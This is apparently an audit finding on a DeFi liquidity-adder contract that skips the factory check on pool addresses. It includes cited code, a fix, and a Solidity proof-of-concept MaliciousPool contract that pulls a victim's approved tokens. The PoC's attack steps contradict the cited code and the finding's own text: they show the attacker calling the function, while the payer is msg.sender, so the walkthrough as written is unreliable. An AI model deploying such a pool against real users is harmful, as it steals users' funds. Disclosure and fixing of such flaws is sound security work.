### Title
Missing Factory Validation in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain User-Approved Tokens — (File: `metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

---

### Summary

`MetricOmmPoolLiquidityAdder` accepts an arbitrary `pool` address from the caller without verifying it against the factory registry. A malicious pool can exploit the callback settlement path to pull any ERC-20 tokens the user has approved to the adder, up to the user-supplied `maxAmountToken0`/`maxAmountToken1` caps.

---

### Finding Description

`MetricOmmSimpleRouter` enforces factory membership on every pool it touches via `_requireFactoryPool(pool)` before storing the pool in transient context: [1](#0-0) 

`MetricOmmPoolLiquidityAdder` performs no equivalent check. The NatSpec even documents the omission explicitly: [2](#0-1) 

The internal `_addLiquidity` helper stores the caller-supplied `pool` directly into transient pay-context and then calls `pool.addLiquidity(...)`: [3](#0-2) 

The callback `metricOmmModifyLiquidityCallback` then validates only that `msg.sender` equals the pool stored in transient storage — which is the attacker-controlled address — and trusts `msg.sender.getImmutables()` to learn which tokens to pull: [4](#0-3) 

Because `token0`/`token1` are read from the malicious pool's own `getImmutables()`, the attacker can return any token address. The subsequent `pay(token0, payer, msg.sender, amount0Delta)` call executes `IERC20(token0).safeTransferFrom(payer, maliciousPool, amount0Delta)`, draining the user's balance of any token they have approved to the adder.

The same unvalidated path is reachable through `addLiquidityWeighted`, where the probe call also goes to the malicious pool. The malicious pool can revert with a crafted `LiquidityProbe(need0, need1)` payload to manipulate the share-scaling step before the paying call: [5](#0-4) 

---

### Impact Explanation

Direct loss of user principal. Any ERC-20 token the victim has approved to `MetricOmmPoolLiquidityAdder` can be stolen up to the `maxAmountToken0`/`maxAmountToken1` values the victim passes. Because users must pre-approve the adder before adding liquidity, the approval surface is always present for active liquidity providers. The attacker receives the tokens directly in the malicious pool contract.

---

### Likelihood Explanation

The attack requires only that a victim be induced to call `addLiquidityExactShares` or `addLiquidityWeighted` with an attacker-controlled `pool` address — a standard phishing or compromised-frontend vector. No privileged role, no special token, and no protocol-level setup is needed. The victim's prior approval to the adder (a normal prerequisite for using the contract) is the only precondition.

---

### Recommendation

Add a factory membership check at the top of `_addLiquidity` (and before the probe call in `addLiquidityWeighted`), mirroring the pattern already used in `MetricOmmSwapRouterBase`:

```solidity
// In MetricOmmPoolLiquidityAdder, add an immutable factory reference:
IMetricOmmPoolFactory internal immutable FACTORY;

// At the start of _addLiquidity:
if (!FACTORY.isPool(pool)) revert InvalidPool(pool);
```

This closes the gap between the router (which validates every pool) and the liquidity adder (which currently trusts the caller entirely).

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Attacker deploys this contract
contract MaliciousPool {
    address public victim;
    address public stolenToken;
    address public adder;

    constructor(address _victim, address _stolenToken, address _adder) {
        victim = _victim;
        stolenToken = _stolenToken;
        adder = _adder;
    }

    // Called by MetricOmmPoolLiquidityAdder._addLiquidity
    function addLiquidity(address, uint80, LiquidityDelta calldata, bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        // Trigger the callback: request max tokens
        IMetricOmmPoolLiquidityAdder(adder).metricOmmModifyLiquidityCallback(
            MAX_AMOUNT,   // amount0Delta = victim's max cap
            0,
            abi.encode(uint8(1)) // KIND_PAY
        );
        return (MAX_AMOUNT, 0);
    }

    // Called by the callback to learn token addresses
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = stolenToken; // ← any token victim approved
        imm.token1 = address(0);
    }
}

// Attack:
// 1. Victim approves MetricOmmPoolLiquidityAdder for 1000e18 of USDC
// 2. Attacker calls:
//    adder.addLiquidityExactShares(
//        address(maliciousPool),
//        victim,
//        0,
//        deltas,
//        1000e18,   // maxAmountToken0
//        0,
//        ""
//    )
// 3. MaliciousPool.addLiquidity fires callback with amount0Delta = 1000e18
// 4. Callback reads token0 = USDC from MaliciousPool.getImmutables()
// 5. pay(USDC, victim, maliciousPool, 1000e18) executes safeTransferFrom
// 6. Victim loses 1000 USDC
```

### Citations

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L87-89)
```text
  function _requireFactoryPool(address pool) internal view {
    if (!FACTORY.isPool(pool)) revert IMetricOmmSimpleRouter.InvalidPool(pool);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L106-115)
```text
    try IMetricOmmPoolActions(pool)
      .addLiquidity(owner, salt, weightDeltas, abi.encode(KIND_PROBE), extensionData) returns (
      uint256, uint256
    ) {
      revert WeightedProbeInconclusive();
    } catch (bytes memory reason) {
      (uint256 need0, uint256 need1) = _decodeLiquidityProbeOrBubble(reason);
      LiquidityDelta memory scaled = _scaleWeightsToShares(weightDeltas, maxAmountToken0, maxAmountToken1, need0, need1);
      return _addLiquidity(pool, owner, salt, scaled, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-177)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
    if (amount0Delta > max0 || amount1Delta > max1) {
      revert MaxAmountExceeded(amount0Delta, amount1Delta, max0, max1);
    }

    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L192-196)
```text
  ) internal returns (uint256 amount0Added, uint256 amount1Added) {
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
      uint256 a0, uint256 a1
```
